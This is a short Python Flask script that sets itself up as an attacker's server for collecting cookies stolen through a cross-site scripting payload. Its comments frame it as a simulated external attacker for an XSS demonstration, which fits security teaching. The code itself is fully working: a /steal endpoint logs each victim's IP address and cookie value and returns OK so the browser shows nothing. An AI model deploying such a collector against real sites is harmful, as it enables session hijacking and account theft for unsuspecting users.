from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
# Allow cross-origin requests since the XSS payload comes from a different port
CORS(app)

@app.route('/steal')
def steal():
    cookie = request.args.get('c')
    
    print("\n" + "!"*60)
    print("🚨 [ATTACKER SERVER] STOLEN DATA RECEIVED 🚨")
    print(f"Victim IP: {request.remote_addr}")
    if cookie:
        print(f"Cookie Data: {cookie}")
    else:
        print("No cookie data received. (Is HttpOnly flag enabled?)")
    print("!"*60 + "\n")
    
    # Return a generic image or 200 OK so the browser doesn't show errors
    return "OK", 200

if __name__ == '__main__':
    print("="*60)
    print(" Listening for stolen cookies on http://0.0.0.0:9001...")
    print("="*60)
    # Run on a completely different port to simulate an external attacker server
    app.run(host='0.0.0.0', port=9001)
